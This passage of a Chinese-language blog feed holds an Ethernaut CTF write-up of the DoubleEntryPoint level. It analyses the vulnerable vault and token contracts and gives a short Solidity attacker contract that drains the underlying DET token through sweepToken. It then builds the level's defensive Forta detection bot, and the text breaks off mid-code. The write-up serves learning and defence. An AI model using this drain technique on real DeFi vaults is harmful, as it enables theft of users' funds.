&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击流程</p><p><img src="/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/image-20230719201923175.png" alt="image-20230719201923175"></p><p>成功</p><p><img src="/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/image-20230719201509325.png" alt="image-20230719201509325"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>26.DoublicEntryPoint</title>
      <link href="/2023/07/19/04.Ethernaut%20CTF/26.DoublicEntryPoint/"/>
      <url>/2023/07/19/04.Ethernaut%20CTF/26.DoublicEntryPoint/</url>
      
        <content type="html"><![CDATA[<h1 id="DoublicEntryPoint"><a href="#DoublicEntryPoint" class="headerlink" title="DoublicEntryPoint"></a>DoublicEntryPoint</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：找到CryptoVault中的bug，用玩家EOA账户创建Forta机器人，进行防御而不是攻击。注意，需要在被攻击之前设置好机器人以完成题目，也就是说，不能你尝试攻击成功后再做防御。因此，你在测试过可以攻击后，要重新生成一个instance，然后直接防御。我猜题目的检测机制是看看能不能攻击成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface DelegateERC20 &#123;</span><br><span class="line">  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Forta is IForta &#123;</span><br><span class="line">  mapping(address =&gt; IDetectionBot) public usersDetectionBots;</span><br><span class="line">  mapping(address =&gt; uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  function setDetectionBot(address detectionBotAddress) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">    if(address(usersDetectionBots[user]) == address(0)) return;</span><br><span class="line">    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125; catch &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function raiseAlert(address user) external override &#123;</span><br><span class="line">      if(address(usersDetectionBots[user]) != msg.sender) return;</span><br><span class="line">      botRaisedAlerts[msg.sender] += 1;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CryptoVault &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    IERC20 public underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address recipient) &#123;</span><br><span class="line">        sweptTokensRecipient = recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setUnderlying(address latestToken) public &#123;</span><br><span class="line">        require(address(underlying) == address(0), &quot;Already set&quot;);</span><br><span class="line">        underlying = IERC20(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ...</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function sweepToken(IERC20 token) public &#123;</span><br><span class="line">        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);</span><br><span class="line">        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;</span><br><span class="line">    DelegateERC20 public delegate;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;</span><br><span class="line">        delegate = newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">        if (address(delegate) == address(0)) &#123;</span><br><span class="line">            return super.transfer(to, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    Forta public forta;</span><br><span class="line"></span><br><span class="line">    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;</span><br><span class="line">        delegatedFrom = legacyToken;</span><br><span class="line">        forta = Forta(fortaAddress);</span><br><span class="line">        player = playerAddress;</span><br><span class="line">        cryptoVault = vaultAddress;</span><br><span class="line">        _mint(cryptoVault, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyDelegateFrom() &#123;</span><br><span class="line">        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier fortaNotify() &#123;</span><br><span class="line">        address detectionBot = address(forta.usersDetectionBots(player));</span><br><span class="line"></span><br><span class="line">        // Cache old number of bot alerts</span><br><span class="line">        uint256 previousValue = forta.botRaisedAlerts(detectionBot);</span><br><span class="line"></span><br><span class="line">        // Notify Forta</span><br><span class="line">        forta.notify(player, msg.data);</span><br><span class="line"></span><br><span class="line">        // Continue execution</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        // Check if alarms have been raised</span><br><span class="line">        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateTransfer(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        address origSender</span><br><span class="line">    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        _transfer(origSender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>题目看起来挺复杂，别被吓到（好吧我已经被吓到了:fearful:），走流程分析。</p><p>我们第一步要看看这个题目都有些啥合约，根据名字、继承关系和题目描述，我们可以推断他们的大概职责：</p><ul><li>LegacyToken(LGT)，DoubleEntryPoint(DET)：两个ERC20代币合约</li><li>CryptoVault：金库合约</li><li>Forta：报警机器人，任何人都可以在这里注册机器人，然后检测其他合约，交易异常则发出报警</li></ul><h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2.详细分析"></a>2.详细分析</h3><p>知道了各个合约的职责，我们就要详细分析每个合约干了些什么。通常顺序是先看方法名理解会做啥事情，然后再具体分析代码逻辑</p><ul><li><p>LegacyToken(LGT)</p><ul><li>重写了transfer<ul><li>如果delagate地址没有设置，或者设为0，则正常调用ERC20标准的transfer</li><li>如果delagate设置为其他值，则调用delegate的<code>delegateTransfer()</code>方法。本题中，delegate是DoubleEntryPoint合约，因此只会走这里而不会调用ERC20标准的transfer</li></ul></li><li>只有onwer可以修改delagate</li></ul></li><li><p>DoubleEntryPoint(DET)</p><ul><li>初始化所有变量，然后mint 100 个DET给CryptoVault(金库)</li><li>onlyDelegateFrom修饰的方法只可以由delegatedFrom调用，也就是LegacyToken(LGT)</li><li>fortaNotify：用于报警机器人，首先获取报警机器人之前报警的次数，执行报警机器人的<code>norify()</code>，也就是让报警机器人执行<code>handleTransaction()</code>来处理这笔交易。然后执行被修饰的方法。如果这笔交易将会发生警报，那么将会增加报警的次数，一旦新的报警次数大于之前的（也就是说这次交易发生了报警嘛），就将这笔交易revert</li><li><code>delegateTransfer()</code>只能由LegacyToken(LGT)合约调用，并且fortaNotify充当报警机器人进行监控，如果发生报警则交易revert。如果一切顺利，我们将调用<code>_transfer()</code>方法将DET代币转移</li></ul></li><li><p>CryptoVault(金库)</p><ul><li><p>这个合约有bug，我们需要做的不是攻击，而是帮助这个合约进行防御</p></li><li><p>持有100个DET和LGT代币</p></li><li><p><code>setUnderlying()</code>设置底层代币地址，并且只能设置一次，也就是DoubleEntryPoint(DET)，因为题目说了：</p><blockquote><p>The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it.</p></blockquote></li><li><p><code>sweepToken()</code>在确保要被转移的代币不是DET的情况下，将本合约中的此token所有余额转移到sweptTokensRecipient中。当然sweptTokensRecipient我们无法修改。</p></li></ul></li><li><p>Forta(报警机器人)</p><ul><li>用于监控，检测DeFi、NFT、DAO、跨链桥等</li><li><code>setDetectionBot()</code>方法，任何人都可以实现一个报警机器人（需要实现相应的方法），然后注册到本合约Forta中使用。</li><li><code>raiseAlert()</code>增加报警次数</li></ul></li></ul><h3 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a>3.寻找漏洞</h3><p>要找到漏洞，要看看现在我们拥有什么。题目给我们的instance是DET合约，这个可以通过到<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/DoubleEntryPointFactory.sol">github仓库</a>得知：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createInstance(address _player) override public payable returns (address) &#123;</span><br><span class="line">....</span><br><span class="line">    DoubleEntryPoint newToken = new DoubleEntryPoint(address(oldToken), address(vault), address(forta), _player);</span><br><span class="line">......</span><br><span class="line">    return address(newToken);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后拿着这个instance地址，查看slot情况，我们遍历前15个slot，结果如下。因为DET继承了好几个合约，继承的slot是按顺序往下排的，因此他本身的四个变量的slot是6~9。并且CryptoVault是slot 6。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Address] 0x494Cb524120F5EFFbA2a8430F8d41aB6AcbF11A1 (DET)</span><br><span class="line">[Slot 0] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 1] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 2] 0x0000000000000000000000000000000000000000000000056bc75e2d63100000</span><br><span class="line">[Slot 3] 0x446f75626c65456e747279506f696e74546f6b656e000000000000000000002a</span><br><span class="line">[Slot 4] 0x4445540000000000000000000000000000000000000000000000000000000006</span><br><span class="line">[Slot 5] 0x0000000000000000000000009451961b7aea1df57bc20cc68d72f662241b5493</span><br><span class="line">[Slot 6] 0x0000000000000000000000002afe0c3dc3a9cf42a0b0cf6ace3e00d6c4ce66d5 // CryptoVault,此合约中包含DET</span><br><span class="line">[Slot 7] 0x000000000000000000000000d3e65149c212902749d49011b6ab24bba30d97c6 // player</span><br><span class="line">[Slot 8] 0x00000000000000000000000012cae34400598ab6afc58b670a1a1e80cdbdaf78 // delegatedFrom(LGT)</span><br><span class="line">[Slot 9] 0x0000000000000000000000005dfa1e4e8c1f4a3f88ff2ed3a12e92d3c8129ea9 // forta</span><br><span class="line">[Slot 10] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 11] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 12] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 13] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 14] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>我们看看slot 6 CryptoVault在Etherscan的资产情况，确实拥有DET和LGT各100个</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719164823560.png" alt></p><p>因为金库CryptoVault中的<code>sweepToken()</code>除了无法提取底层代币，其他的代币都可以提取。那么理论上任何人都可以提取LGT这个代币，而无法提取DET这个底层代币，这也是业务的期望逻辑。但是这就是问题就在这里，我们可以把底层代币DET提取出来。</p><p>攻击方法是调用CryptoVault的<code>sweepToken()</code>，攻击思路如下：</p><p>1.在CryptoVault合约中调用sweepToken( LGT )，可以调用成功因为传参不是DET</p><p>2.在LGT合约中，会调用到<code>transfer()</code>。这不是<code>transfer()</code>的标准实现，这种魔改的方法往往会有问题。因为LGT合约中已经设置过delegate了，为DET，因此会走到else语句中。注意，这里的msg.sender是CryptoVault。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">    if (address(delegate) == address(0)) &#123;</span><br><span class="line">    return super.transfer(to, value);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.然后会程序流会跳转到DET合约的<code>delegateTransfer()</code>方法，然后进行转账。因为没有设置机器人来报警，因此会被转走代币。</p><p>4.这样，我们就在CryptoVault偷走DET！</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719174622591.png" alt></p><p>攻击代码可以是如下。将题目instance地址传入，然后调用<code>attack_stealDET()</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address) external;</span><br><span class="line">    function notify(address , bytes calldata ) external;</span><br><span class="line">    function raiseAlert(address ) external;</span><br><span class="line">&#125;//报警机器人</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address, bytes calldata ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ICryptoVault&#123;</span><br><span class="line">    function sweepToken(address) external;</span><br><span class="line">    function underlying() external view returns(address);</span><br><span class="line">&#125; // 金库</span><br><span class="line"></span><br><span class="line">interface ILegacyToken &#123; &#125; // 垃圾币</span><br><span class="line"></span><br><span class="line">interface IDoubleEntryPoint &#123;</span><br><span class="line">    function cryptoVault() external view returns(address);</span><br><span class="line">    function delegatedFrom() external view returns(address);</span><br><span class="line">    function forta() external view returns(address);</span><br><span class="line">&#125; // 底层币</span><br><span class="line"></span><br><span class="line">// 1. 获取一个实例，尝试是否可以攻击成功</span><br><span class="line">contract attaker&#123;</span><br><span class="line">    IDoubleEntryPoint instance; // 题目实例</span><br><span class="line">    IForta forta; // 报警机器人</span><br><span class="line">    IDoubleEntryPoint DET; // 底层币</span><br><span class="line">    ILegacyToken LGT; // 垃圾币</span><br><span class="line">    ICryptoVault vault; // 金库</span><br><span class="line"></span><br><span class="line">    constructor(IDoubleEntryPoint _addr) public &#123;</span><br><span class="line">        // 初始化题目信息</span><br><span class="line">        instance = _addr;</span><br><span class="line">        vault = ICryptoVault(instance.cryptoVault());</span><br><span class="line">        DET = IDoubleEntryPoint(vault.underlying());</span><br><span class="line">        LGT = ILegacyToken(instance.delegatedFrom());</span><br><span class="line">        forta = IForta(instance.forta());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_stealDET() public &#123; // 2.我们来尝试一下是否可以攻击成功</span><br><span class="line">        vault.sweepToken(address(LGT));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-做出防御"><a href="#4-做出防御" class="headerlink" title="4.做出防御"></a>4.做出防御</h3><p>那么，我们就大概知道了攻击逻辑：当调用跳转到LGT合约的时候，又会让CryptoVault跳转到DET，并调用DET时的msg.sender是CryptoVault。这样就实现了偷钱。因此，我们的防御思路就是在调用DET的转账方法的时候，设置一个报警机器人，让它来检查LGT的<code>transfer()</code>第三个参数msg.sender是不是CryptoVault即可，是则报警（也就是将报警数量+1，调用<code>raiseAlert()</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return delegate.delegateTransfer(to, value, msg.sender);</span><br></pre></td></tr></table></figure><p>那么如何找到第三个参数msg.sender呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">     if (address(delegate) == address(0)) &#123;</span><br><span class="line">         return super.transfer(to, value);</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function delegateTransfer(</span><br><span class="line">     address to,</span><br><span class="line">     uint256 value,</span><br><span class="line">     address origSender</span><br><span class="line"> ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">     _transfer(origSender, to, value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">     if(address(usersDetectionBots[user]) == address(0)) return;</span><br><span class="line">     try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">         return;</span><br><span class="line">     &#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleTransaction()传入的calldata如下：</p><div class="table-container"><table><thead><tr><th>长度</th><th>offset</th><th>变量类型</th><th>值</th></tr></thead><tbody><tr><td>4 bytes</td><td>0x0</td><td>bytes4</td><td>函数选择器handleTransaction(address,bytes)：0x220ab6aa</td></tr><tr><td>32 bytes</td><td>0x4</td><td>address</td><td>user</td></tr><tr><td>32 bytes</td><td>0x24</td><td>uint256</td><td>Offset of <code>msgData</code></td></tr><tr><td>32 bytes</td><td>0x44</td><td>uint256</td><td>Length of <code>msgData</code></td></tr><tr><td>4 bytes</td><td>0x64</td><td>bytes4</td><td>函数选择器delegateTransfer(address,uint256,address)：0x9cd1a121</td></tr><tr><td>32 bytes</td><td>0x68</td><td>address</td><td>to</td></tr><tr><td>32 bytes</td><td>0x88</td><td>uint256</td><td>value</td></tr><tr><td>32 bytes</td><td>0xA8</td><td>address</td><td>msg.sender</td></tr><tr><td>28 bytes</td><td>0xC8</td><td>bytes</td><td>补0</td></tr></tbody></table></div><p>我们需要判断的msg.sender位于calldata的0xA8之后的32字节，因此我们用内联汇编取出来判断即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calldataload(0xa8)</span><br></pre></td></tr></table></figure><p>完整的报警机器人实现如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 3. 部署一个MyRobot</span><br><span class="line">contract MyRobot is IDetectionBot &#123;</span><br><span class="line">    ICryptoVault vault;</span><br><span class="line"></span><br><span class="line">    constructor(ICryptoVault _addr) public &#123;</span><br><span class="line">        vault = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == address(vault)) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 4. 创建一个新的题目instance</span><br><span class="line">// 5. 用EOA账户调用新实例的IForta的setDetectionBot()设置报警机器人</span><br><span class="line">// 6. 完成</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>完整代码如下，根据代码中的序号一步一步调用即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address) external;</span><br><span class="line">    function notify(address , bytes calldata ) external;</span><br><span class="line">    function raiseAlert(address ) external;</span><br><span class="line">&#125; // 报警机器人</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address, bytes calldata ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ICryptoVault&#123;</span><br><span class="line">    function sweepToken(address) external;</span><br><span class="line">    function underlying() external view returns(address);</span><br><span class="line">&#125; // 金库</span><br><span class="line"></span><br><span class="line">interface ILegacyToken &#123; &#125; // 垃圾币</span><br><span class="line"></span><br><span class="line">interface IDoubleEntryPoint &#123;</span><br><span class="line">    function cryptoVault() external view returns(address);</span><br><span class="line">    function delegatedFrom() external view returns(address);</span><br><span class="line">    function forta() external view returns(address);</span><br><span class="line">&#125; // 底层币</span><br><span class="line"></span><br><span class="line">// 1. 获取一个实例，尝试是否可以攻击成功</span><br><span class="line">contract attaker&#123;</span><br><span class="line">    IDoubleEntryPoint instance; // 题目实例</span><br><span class="line">    IForta forta; // 报警机器人</span><br><span class="line">    IDoubleEntryPoint DET; // 底层币</span><br><span class="line">    ILegacyToken LGT; // 垃圾币</span><br><span class="line">    ICryptoVault vault; // 金库</span><br><span class="line"></span><br><span class="line">    constructor(IDoubleEntryPoint _addr) public &#123;</span><br><span class="line">        // 初始化题目信息</span><br><span class="line">        instance = _addr;</span><br><span class="line">        vault = ICryptoVault(instance.cryptoVault());</span><br><span class="line">        DET = IDoubleEntryPoint(vault.underlying());</span><br><span class="line">        LGT = ILegacyToken(instance.delegatedFrom());</span><br><span class="line">        forta = IForta(instance.forta());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_stealDET() public &#123; // 